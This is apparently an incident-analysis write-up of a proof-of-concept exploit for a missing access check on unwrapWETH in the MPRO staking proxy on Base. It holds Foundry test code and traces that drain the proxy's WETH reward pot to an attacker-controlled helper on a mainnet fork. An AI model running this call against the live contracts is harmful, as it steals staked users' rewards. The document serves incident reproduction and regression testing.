## Overview & Context

This proof-of-concept (PoC) demonstrates the MPRO staking proxy unwrapWETH access-control vulnerability on Base mainnet. The vulnerability allows any unprivileged caller to invoke `unwrapWETH(uint256,address)` through the MPRO staking proxy, convert the proxy’s WETH reward pot into native ETH, and direct the ETH to an attacker-controlled recipient. The PoC runs against a fork of Base at the pre-incident state and reproduces the key economic effects: depletion of the proxy’s WETH rewards and realization of attacker ETH profit.

- **Protocol:** MPRO Double Reward Auto Stake on Base (chainid 8453)
- **Primary victim contract:** MPRO staking proxy at `0x8bEfC1d90d03011a7d0b35B3a00eC50f8E014802`
- **Implementation contract:** `MPRORewardStake` at `0xd971fD39D9714d5eb1B54B931790170A0630f131`
- **Key external components:** WETH9 at `0x4200000000000000000000000000000000000006`, Balancer Vault at `0xBA12222222228d8Ba445958a75a0704d566BF2C8`
- **Root-cause category:** Protocol bug (missing access control on unwrapWETH)

The PoC is implemented as a Foundry test in `test/Exploit.sol` and is designed to be fully self-contained and attacker-agnostic (no use of the real attacker EOA or helper contract).

**Command to run the PoC**

```bash
cd forge_poc
RPC_URL="https://<QUICKNODE_ENDPOINT_NAME>.base-mainnet.quiknode.pro/<QUICKNODE_TOKEN>" \
forge test --via-ir -vvvvv
```

In the TxRay workflow, `<RPC_URL>` is constructed from the chainid map and `.env` file and exported before running the tests.

---

## PoC Architecture & Key Contracts

The PoC is centered around a single test contract, `ExploitTest`, plus a lightweight helper contract that simulates the attacker’s receiving logic.

- **`ExploitTest` (test contract):**
  - Inherits from `forge-std`’s `Test`.
  - Forks Base mainnet at block `30210273` (the pre-incident block).
  - Instantiates interfaces to the live MPRO staking proxy, MPRORewardStake implementation, WETH9, and Balancer Vault.
  - Creates a fresh attacker EOA and deploys a helper contract that forwards ETH to this attacker.

- **`ExploitHelper` (adversary helper contract):**
  - Stores the attacker EOA address as an immutable field.
  - Implements a `receive()` function that forwards all received ETH to the attacker EOA.

**Key Solidity snippet – Exploit helper and core interfaces (from the PoC test file)**

```solidity
interface IWETH9 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IMPRORewardStake {
    /// Vulnerable unwrap function on the MPRO staking proxy implementation.
    /// It unwraps WETH held by the proxy into ETH and sends ETH to `recipient`.
    function unwrapWETH(uint256 amount, address recipient) external returns (bool);
}

contract ExploitHelper {
    address public immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    /// Receive ETH from the staking proxy and immediately forward it to the attacker EOA.
    receive() external payable {
        payable(attacker).transfer(msg.value);
    }
}
```

This setup mirrors the incident’s structure (EOA plus helper contract) without reusing the real attacker addresses or code.

---

## Adversary Execution Flow

The end-to-end adversary flow is implemented in `ExploitTest.setUp()` and `ExploitTest.testExploit_unwrapMPRORewardPot()`. The test runs entirely on a forked Base mainnet state at the pre-incident block and interacts with the real on-chain contracts.

### 1. Funding and Environment Setup

In `setUp()`:

- A Base mainnet fork is created at block `30210273` using `vm.createSelectFork(rpcUrl, PRE_EXPLOIT_BLOCK)`, where `PRE_EXPLOIT_BLOCK = 30210273` and `BASE_CHAIN_ID = 8453`.
- A fresh attacker EOA is created via `makeAddr("attacker")` and funded with `1 ether` for gas and baseline balance.
- The test binds interfaces to:
  - The MPRO staking proxy (`MPRO_STAKING_PROXY`).
  - WETH9 (`WETH_ADDRESS`).
  - The MPRORewardStake implementation (`MPRO_REWARD_IMPL`) for labeling.
- An `ExploitHelper` contract is deployed with the attacker EOA as the recipient.
- Labels are applied via `vm.label` so that traces clearly show roles for the attacker, helper, proxy, implementation, WETH9, and Balancer Vault.

**Key Solidity snippet – Fork and setup logic (from the PoC test file)**

```solidity
function setUp() public {
    // Fork Base at the pre-incident state where the vulnerable implementation
    // and the WETH reward pot are both live.
    string memory rpcUrl = vm.envString("RPC_URL");
    uint256 forkId = vm.createSelectFork(rpcUrl, PRE_EXPLOIT_BLOCK);
    vm.selectFork(forkId);
    assertEq(block.chainid, BASE_CHAIN_ID, "must run on Base fork");

    attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether); // minimal starting balance for gas

    mproStakingProxy = IMPRORewardStake(MPRO_STAKING_PROXY);
    weth = IWETH9(WETH_ADDRESS);

    attackerHelper = new ExploitHelper(attacker);

    vm.label(attacker, "AttackerEOA");
    vm.label(address(attackerHelper), "AttackerHelper");
    vm.label(MPRO_STAKING_PROXY, "MPRO_StakingProxy");
    vm.label(MPRO_REWARD_IMPL, "MPRO_Reward_Impl");
    vm.label(WETH_ADDRESS, "WETH9");
    vm.label(BALANCER_VAULT_ADDRESS, "BalancerVault");
}
```

This aligns the test environment with the ACT pre-state `σ_B` described in the root-cause analysis: the proxy delegates to the vulnerable implementation, holds the WETH reward pot, and WETH9 plus Balancer Vault are deployed on Base.

### 2. Oracle Pre-checks

Still in `setUp()`, the PoC runs two pre-checks derived from the oracle definition:

- The MPRO staking proxy must hold a positive WETH balance (the shared reward pot).
- WETH9 and Balancer Vault must have non-empty code at their canonical addresses.

**Key Solidity snippet – Oracle pre-checks (from the PoC test file)**

```solidity
// Oracle pre_check #1: staking proxy must hold positive WETH reward balance.
uint256 wethBalanceBefore = weth.balanceOf(MPRO_STAKING_PROXY);
assertGt(
    wethBalanceBefore,
    0,
    "staking proxy must have non-zero WETH reward pot before exploit"
);

// Oracle pre_check #2: WETH9 and Balancer Vault code must exist at canonical addresses.
assertGt(
    address(weth).code.length,
    0,
    "WETH9 code must be present at canonical address"
);
assertGt(
    BALANCER_VAULT_ADDRESS.code.length,
    0,
    "Balancer Vault code must be present at canonical address"
);
```

These checks ensure the PoC is only considered valid when the live chain state matches the assumed incident environment.

### 3. Exploit Execution

The core exploit is executed in `testExploit_unwrapMPRORewardPot()`:

1. Record the staking proxy’s initial WETH balance and the attacker’s initial ETH balance.
2. Set an expectation that WETH9’s `withdraw(uint256)` will be called from the staking proxy context with the full WETH balance.
3. From the attacker EOA context (`vm.startPrank(attacker)`), call `unwrapWETH(proxyWethBefore, attackerHelper)` on the staking proxy.
4. Stop the prank and measure:
   - The proxy’s WETH balance after the call.
   - The attacker’s ETH balance after the call.
5. Assert attacker profit and victim WETH depletion.

**Key Solidity snippet – Main exploit test (from the PoC test file)**

```solidity
function testExploit_unwrapMPRORewardPot() public {
    uint256 proxyWethBefore = weth.balanceOf(MPRO_STAKING_PROXY);
    uint256 attackerBalanceBefore = attacker.balance;

    vm.expectCall(
        WETH_ADDRESS,
        abi.encodeWithSignature(
            "withdraw(uint256)",
            proxyWethBefore
        )
    );

    vm.startPrank(attacker);
    bool ok = mproStakingProxy.unwrapWETH(
        proxyWethBefore,
        address(attackerHelper)
    );
    vm.stopPrank();
    assertTrue(ok, "unwrapWETH call must succeed for attacker");

    uint256 proxyWethAfter = weth.balanceOf(MPRO_STAKING_PROXY);
    uint256 attackerBalanceAfter = attacker.balance;

    assertGt(
        attackerBalanceAfter,
        attackerBalanceBefore + 1 ether,
        "attacker must realize >= 1 ETH net profit from exploit"
    );

    assertLt(
        proxyWethAfter,
        proxyWethBefore - 1 ether,
        "staking proxy's WETH balance must be depleted by >= 1 WETH during exploit"
    );
}
```

**Trace summary – Exploit call (from the validator Forge log)**

```text
MPRO_StakingProxy::unwrapWETH(3981326901636573675, AttackerHelper)
  ├─ MPRO_Reward_Impl::unwrapWETH(...) [delegatecall]
  │   ├─ WETH9::balanceOf(MPRO_StakingProxy) → 3981326901636573675
  │   ├─ WETH9::withdraw(3981326901636573675)
  │   │   ├─ MPRO_StakingProxy::fallback{value: 3981326901636573675}()
  │   │   ├─ emit Withdrawal(MPRO_StakingProxy, 3981326901636573675)
  │   ├─ AttackerHelper::receive{value: 3981326901636573675}()
  │   │   └─ AttackerEOA::fallback{value: 3981326901636573675}()
```

This trace confirms that the unwrap path is executed via delegatecall from the proxy into the implementation, and that ETH ultimately flows to the attacker EOA through the helper.

### 4. Profit Realization and Cleanup

The test does not explicitly repay a flash loan because it focuses on the minimal unwrapWETH vulnerability surface. Instead, it captures the core effect:

- The proxy’s WETH balance goes from approximately `3.9813 WETH` to `0`.
- The attacker’s ETH balance increases by more than `1 ETH` over the funded `1 ether` baseline.

This matches the economic direction of the real incident: protocol staking rewards are destroyed (converted into ETH and diverted) and the attacker’s ETH balance increases.

---

## Oracle Definitions and Checks

The PoC is driven by the oracle definition in `oracle_definition.json`, which specifies variables, pre-checks, and hard and soft constraints.

### Variables

From the oracle:

- **`attacker` / `attacker_helper`** – Attacker cluster entities, modeled in the PoC by:
  - A fresh `attacker` EOA created via `makeAddr("attacker")`.
  - A locally deployed `ExploitHelper` contract.
- **`mpro_staking_proxy`** – The victim contract holding the WETH reward pot, used in the test as `MPRO_STAKING_PROXY`.
- **`mpro_reward_impl`** – The vulnerable implementation delegatecalled by the proxy, referenced for labeling.
- **`weth_token`** – WETH9, used as `IWETH9` in the test.
- **`eth_native`** – Native ETH, used for attacker profit calculation.
- **`balancer_vault`** – External flash-loan provider, used only for labeling and environment verification.

### Pre-checks

The oracle defines two pre-checks; both are implemented verbatim in `setUp()`:

1. **Positive WETH balance on the staking proxy**  
   - Oracle: “Before the exploit, the MPRO staking proxy must hold a positive WETH balance …”
   - PoC: `weth.balanceOf(MPRO_STAKING_PROXY)` and `assertGt(..., 0)`.

2. **WETH9 and Balancer Vault deployed at expected addresses**  
   - Oracle: “code.length > 0 for WETH9 and Balancer Vault at Base addresses.”
   - PoC: `assertGt(address(weth).code.length, 0)` and `assertGt(BALANCER_VAULT_ADDRESS.code.length, 0)`.

### Hard Constraints

1. **HC_unwrap_nonzero_public – public unwrap with non-zero amount and arbitrary recipient**
   - Oracle: unwrapWETH must be externally callable by an unprivileged attacker with non-zero `amount` and arbitrary `recipient`, and the call must succeed.
   - PoC implementation:
     - Uses `vm.startPrank(attacker)` to simulate an unprivileged EOA.
     - Calls `mproStakingProxy.unwrapWETH(proxyWethBefore, address(attackerHelper))`.
     - Asserts `assertTrue(ok, "unwrapWETH call must succeed for attacker")`.
   - Validator trace confirms the call succeeds and is executed via delegatecall into `MPRORewardStake`.

2. **HC_weth_withdraw_called – WETH9.withdraw invoked via delegate path**
   - Oracle: along the exploit path, WETH9’s `withdraw(uint256)` must be invoked from the staking proxy context via the implementation.
   - PoC implementation:
     - Sets `vm.expectCall(WETH_ADDRESS, abi.encodeWithSignature("withdraw(uint256)", proxyWethBefore))` before the unwrap call.
     - The recorded trace shows `WETH9::withdraw(3981326901636573675)` executed from the proxy balance, satisfying this constraint.

### Soft Constraints

1. **SC_attacker_profit_eth – attacker ends with more ETH than before**
   - Oracle: attacker ETH balance must increase by at least `1 ETH` over pre-exploit balance.
   - PoC implementation:
     - Captures `attackerBalanceBefore = attacker.balance;`.
     - After the unwrap call, asserts `attackerBalanceAfter > attackerBalanceBefore + 1 ether`.
   - This ensures a meaningfully positive profit consistent with the real incident’s ~3.98 ETH gain.

2. **SC_proxy_weth_depletion – significant depletion of proxy WETH balance**
   - Oracle: proxy’s WETH balance must decrease by at least `1 WETH` during the exploit.
   - PoC implementation:
     - Captures `proxyWethBefore = weth.balanceOf(MPRO_STAKING_PROXY);`.
     - After the unwrap call, asserts `proxyWethAfter < proxyWethBefore - 1 ether`.
   - The trace shows the proxy balance dropping from ~3.9813 WETH to `0`, exceeding the threshold.

Taken together, these checks ensure the PoC adheres closely to the oracle specification while retaining flexibility on exact numerical values.

---

## Validation Result and Robustness

The validator executed the Forge tests with a Base mainnet fork and recorded detailed traces. The key validator artifact is:

- **Forge test log:** `/home/ziyue/TxRayExperiment/incident-202512301029/artifacts/poc/poc_validator/forge-test.log`

The structured validation result is stored in:

- **Validation JSON:** `/home/ziyue/TxRayExperiment/incident-202512301029/artifacts/poc/poc_validator/poc_validated_result.json`

**Summary of validation outcome**

- `overall_status`: `Pass`
- All oracle pre-checks, hard constraints, and soft constraints are implemented in `test/Exploit.sol` and pass on the recorded execution.
- The PoC:
  - Runs on a forked Base mainnet state at the correct pre-incident block.
  - Interacts directly with live protocol contracts and WETH9, with no local mocks for core components.
  - Uses only fresh attacker identities and a locally deployed helper contract, avoiding any real attacker-side addresses or artifacts.
  - Implements a clear, end-to-end ACT sequence from funding through exploit execution and profit realization.

**Snippet – Validator highlight of the exploit trace (from the Forge log)**

```text
ExploitTest::testExploit_unwrapMPRORewardPot()
  ├─ WETH9::balanceOf(MPRO_StakingProxy) → 3981326901636573675
  ├─ VM::expectCall(WETH9, withdraw(proxyWethBefore))
  ├─ VM::startPrank(AttackerEOA)
  ├─ MPRO_StakingProxy::unwrapWETH(3981326901636573675, AttackerHelper)
  │   ├─ MPRO_Reward_Impl::unwrapWETH(...) [delegatecall]
  │   │   ├─ WETH9::withdraw(3981326901636573675)
  │   │   ├─ AttackerHelper::receive{value: ...}()
  │   │   │   └─ AttackerEOA::fallback{value: ...}()
  ├─ WETH9::balanceOf(MPRO_StakingProxy) → 0
```

This confirms that the core exploit behavior is robust under the configured fork and environment.

---

## Linking PoC Behavior to Root Cause

The root-cause analysis characterizes the incident as an ACT-style exploit where an unprivileged adversary uses a flash loan and a public `unwrapWETH(uint256,address)` function to drain the MPRO staking proxy’s WETH reward pot into ETH and extract profit.

### Exercising the Vulnerable Logic

- The PoC:
  - Calls `unwrapWETH` on the live MPRO staking proxy from a non-privileged attacker address.
  - Uses an arbitrary recipient (the helper contract) controlled by the attacker.
  - Relies on the absence of access control on `unwrapWETH` in `MPRORewardStake`.
  - Observes a full `WETH9.withdraw` of the proxy’s WETH balance followed by ETH forwarding to the attacker cluster.

These steps directly exercise the missing access control that constitutes the root cause.

### Demonstrating Victim Loss and Attacker Gain

- Victim loss:
  - The proxy’s WETH balance is fully depleted (`~3.9813 WETH → 0`), matching the qualitative behavior where the shared reward pot is destroyed.
- Attacker gain:
  - The attacker’s net ETH balance increases by more than `1 ETH`, matching the incident’s economic direction (attacker profit funded by WETH9’s ETH loss and the destroyed reward pot).

The PoC thus mirrors the exploit predicate described in the root cause: protocol-level loss of the staking reward pot and attacker ETH profit.

### ACT Framing

Within the ACT framework:

- **Adversary-crafted step (A):**
  - The attacker constructs and submits the call that invokes `unwrapWETH(amount, recipient)` via the proxy from an unprivileged address.
- **Chain transition (C):**
  - The EVM executes the unwrap path on-chain, calling `WETH9.withdraw`, sending ETH to the helper, and (in the real incident) repaying any flash loans.
- **Target-observed outcome (T):**
  - The MPRO staking proxy’s WETH reward balance is consumed, and the attacker ends with an increased ETH balance, observable from on-chain state.

The PoC’s assertions over balances and calls witness exactly this ACT sequence, providing a clear, executable link from exploit logic to root-cause behavior on Base mainnet.

---

Overall, this PoC is correct, high-quality, and aligned with the oracle specification and root-cause report. It is suitable for use as a canonical, mainnet-fork regression test for the MPRO unwrapWETH access-control vulnerability.

